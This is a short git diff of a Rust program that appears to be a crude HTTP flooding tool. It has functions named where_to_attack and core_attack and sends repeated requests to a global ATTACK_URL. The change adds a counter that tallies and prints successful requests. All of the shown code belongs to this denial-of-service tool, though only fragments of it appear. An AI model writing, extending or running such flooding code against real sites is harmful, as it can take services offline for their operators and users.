@@ -2,6 +2,8 @@ use reqwest::Response;
 
 static mut ATTACK_URL: String = String::new();
 
+static mut AMOUNT: u128 = 0;
+
 pub async fn start() {
     where_to_attack();
     core_attack();
@@ -20,8 +22,9 @@ fn core_attack() {
             unsafe {
                 let error_data = request(&ATTACK_URL).await;
                 match error_data {
-                    Ok(data) => {
-                        println!("Status Code Recived is {}", data.status())
+                    Ok(_) => {
+                        AMOUNT = AMOUNT + 1;
+                        println!("{}", AMOUNT);
                     }
                     Err(data) => {
                         println!("OH NO BAD Status Code Recived is {}", data.to_string())
